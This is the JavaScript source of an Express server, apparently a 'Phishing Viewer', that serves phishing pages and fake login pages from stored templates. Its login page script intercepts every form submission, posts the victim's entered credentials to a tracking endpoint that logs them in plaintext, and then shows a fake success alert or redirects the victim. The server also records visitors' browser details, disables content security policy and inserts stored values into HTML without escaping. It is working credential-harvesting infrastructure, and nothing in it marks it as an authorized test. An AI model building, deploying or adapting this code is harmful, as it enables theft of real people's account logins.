import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';
import { executeQuery } from './src/utils/database.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Load environment variables
dotenv.config();

const app = express();
const PORT = process.env.PHISHING_VIEWER_PORT || 3002;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false, // Allow inline scripts for phishing templates
  crossOriginEmbedderPolicy: false
}));

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Template rendering function
const renderPhishingTemplate = (website, templateData) => {
  // Base HTML template
  let html = `
<!DOCTYPE html>
<html lang="${website.language || 'en'}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${website.title || 'Loading...'}</title>
    <meta name="description" content="${website.description || ''}">
    <meta property="og:title" content="${website.title || ''}">
    <meta property="og:description" content="${website.description || ''}">
    ${website.thumbnail ? `<meta property="og:image" content="${website.thumbnail}">` : ''}
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .phishing-container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .loading {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-size: 18px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="phishing-container">
        <div class="loading" id="loading">Loading...</div>
        <div id="content" style="display: none;">
            ${templateData || '<div style="padding: 20px; text-align: center;">Template content not available</div>'}
        </div>
    </div>
    
    <script>
        // Hide loading and show content
        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('content').style.display = 'block';
        }, 500);
        
        // Track page view
        fetch('/api/track-view', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                slug: '${website.slug}',
                userAgent: navigator.userAgent,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            })
        }).catch(err => console.log('Tracking failed:', err));
        
        // Global Login function for phishing templates
        window.Login = function() {
            window.location.href = '/login/${website.slug}';
        };
    </script>
</body>
</html>`;

  return html;
};

// Login route: /login/{slug}
app.get('/login/:slug', async (req, res) => {
  try {
    const { slug } = req.params;
    
    // Get website data from database
    const websiteQuery = `
      SELECT w.*, 
             lt.content_html as login_template_content
      FROM websites w
      LEFT JOIN templates lt ON w.login_template_id = lt.id AND lt.type = 'login'
      WHERE w.slug = ?
    `;
    
    const result = await executeQuery(websiteQuery, [slug]);
    
    if (!result.success || result.data.length === 0) {
      return res.status(404).send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login Page Not Found</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
                .error { color: #e74c3c; }
            </style>
        </head>
        <body>
            <h1 class="error">404 - Login Page Not Found</h1>
            <p>The requested login page "${slug}" could not be found.</p>
        </body>
        </html>
      `);
    }

    const website = result.data[0];
    
    // If no login template is configured, show error
    if (!website.login_template_content) {
      return res.status(404).send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login Template Not Configured</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
                .error { color: #e74c3c; }
            </style>
        </head>
        <body>
            <h1 class="error">Login Template Not Configured</h1>
            <p>No login template is configured for "${website.title}".</p>
        </body>
        </html>
      `);
    }

    // Update view count for login page
    await executeQuery(
      'UPDATE websites SET view_count = view_count + 1 WHERE slug = ?',
      [slug]
    );

    // Generate login page HTML
    const loginPageHtml = `
<!DOCTYPE html>
<html lang="${website.language || 'en'}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - ${website.title}</title>
    <meta name="description" content="${website.description}">
    <meta property="og:title" content="Login - ${website.title}">
    <meta property="og:description" content="${website.description}">
    ${website.thumbnail ? `<meta property="og:image" content="${website.thumbnail}">` : ''}
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .login-container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .loading {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-size: 18px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="loading" id="loading">Loading login...</div>
        <div id="content" style="display: none;">
            ${website.login_template_content}
        </div>
    </div>
    
    <script>
        // Hide loading and show content
        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('content').style.display = 'block';
        }, 500);
        
        // Track login page view
        fetch('/api/track-view', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                slug: '${slug}',
                page_type: 'login',
                userAgent: navigator.userAgent,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            })
        }).catch(err => console.log('Tracking failed:', err));

        // Handle form submissions
        document.addEventListener('DOMContentLoaded', function() {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    // Collect form data
                    const formData = new FormData(form);
                    const data = Object.fromEntries(formData.entries());
                    
                    // Track login attempt
                    fetch('/api/track-login', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            slug: '${slug}',
                            credentials: data,
                            userAgent: navigator.userAgent,
                            timestamp: new Date().toISOString()
                        })
                    }).catch(err => console.log('Login tracking failed:', err));
                    
                    // Redirect based on website configuration
                    ${website.redirect_url ? `
                    setTimeout(() => {
                        window.location.href = '${website.redirect_url}';
                    }, 1000);
                    ` : `
                    // Show success message and redirect back to main page
                    alert('Đăng nhập thành công!');
                    setTimeout(() => {
                        window.location.href = '/${slug}';
                    }, 1000);
                    `}
                });
            });
        });
    </script>
</body>
</html>`;

    res.send(loginPageHtml);

  } catch (error) {
    console.error('Login page error:', error);
    res.status(500).send(`
      <!DOCTYPE html>
      <html>
      <head>
          <title>Server Error</title>
          <style>
              body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
              .error { color: #e74c3c; }
          </style>
      </head>
      <body>
          <h1 class="error">500 - Server Error</h1>
          <p>An error occurred while loading the login page.</p>
      </body>
      </html>
    `);
  }
});

// Main route: /{slug}
app.get('/:slug', async (req, res) => {
  try {
    const { slug } = req.params;
    
    // Get website data from database
    const websiteQuery = `
      SELECT w.*, 
             pt.content_html as phishing_template_content,
             lt.content_html as login_template_content
      FROM websites w
      LEFT JOIN templates pt ON w.phishing_template_id = pt.id AND pt.type = 'phishing'
      LEFT JOIN templates lt ON w.login_template_id = lt.id AND lt.type = 'login'
      WHERE w.slug = ?
    `;
    
    const result = await executeQuery(websiteQuery, [slug]);
    
    if (!result.success || result.data.length === 0) {
      return res.status(404).send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Page Not Found</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
                .error { color: #e74c3c; }
            </style>
        </head>
        <body>
            <h1 class="error">404 - Page Not Found</h1>
            <p>The requested page "${slug}" could not be found.</p>
        </body>
        </html>
      `);
    }
    
    const website = result.data[0];
    
    // Update view count
    await executeQuery(
      'UPDATE websites SET view_count = view_count + 1 WHERE slug = ?',
      [slug]
    );
    
    // Determine which template to use
    let templateContent = '';
    if (website.phishing_template_content) {
      templateContent = website.phishing_template_content;
    } else if (website.login_template_content) {
      templateContent = website.login_template_content;
    } else {
      // Fallback template
      templateContent = `
        <div style="padding: 40px; text-align: center; background: #f8f9fa;">
          <h1>${website.title}</h1>
          <p>${website.description}</p>
          <div style="margin-top: 30px; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
            <p>This is a demonstration page for: <strong>${website.title}</strong></p>
            <p>Slug: ${website.slug}</p>
            <p>Views: ${website.view_count + 1}</p>
          </div>
        </div>
      `;
    }
    
    // Render and send the phishing page
    const html = renderPhishingTemplate(website, templateContent);
    res.send(html);
    
  } catch (error) {
    console.error('Error serving phishing page:', error);
    res.status(500).send(`
      <!DOCTYPE html>
      <html>
      <head>
          <title>Server Error</title>
          <style>
              body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
              .error { color: #e74c3c; }
          </style>
      </head>
      <body>
          <h1 class="error">500 - Server Error</h1>
          <p>An error occurred while loading this page.</p>
      </body>
      </html>
    `);
  }
});

// API endpoint to track views
app.post('/api/track-view', async (req, res) => {
  try {
    const { slug, page_type, userAgent, referrer, timestamp } = req.body;
    
    // Log the view (you can expand this to store in a separate analytics table)
    console.log(`📊 ${page_type || 'Page'} view: ${slug} | ${userAgent} | ${referrer} | ${timestamp}`);
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error tracking view:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// API endpoint to track login attempts
app.post('/api/track-login', async (req, res) => {
  try {
    const { slug, credentials, userAgent, timestamp } = req.body;
    
    // Log the login attempt (you can expand this to store in a separate table)
    console.log(`🔐 Login attempt: ${slug} | Credentials: ${JSON.stringify(credentials)} | ${userAgent} | ${timestamp}`);
    
    // Here you could save to database for analytics
    // await executeQuery('INSERT INTO login_attempts (slug, credentials, user_agent, timestamp) VALUES (?, ?, ?, ?)', 
    //   [slug, JSON.stringify(credentials), userAgent, timestamp]);
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error tracking login:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    service: 'Phishing Viewer',
    port: PORT,
    timestamp: new Date().toISOString()
  });
});

// Handle redirect URLs
app.get('/redirect/:slug', async (req, res) => {
  try {
    const { slug } = req.params;
    
    const result = await executeQuery(
      'SELECT redirect_url FROM websites WHERE slug = ?',
      [slug]
    );
    
    if (result.success && result.data.length > 0 && result.data[0].redirect_url) {
      return res.redirect(result.data[0].redirect_url);
    }
    
    res.status(404).json({ error: 'Redirect not found' });
  } catch (error) {
    console.error('Error handling redirect:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Phishing Viewer Server running on port ${PORT}`);
  console.log(`📊 Health check: http://localhost:${PORT}/api/health`);
  console.log(`🔗 Access phishing pages: http://localhost:${PORT}/{slug}`);
  console.log(`📝 This server only displays phishing pages and shares database with main server`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully');
  process.exit(0);
});
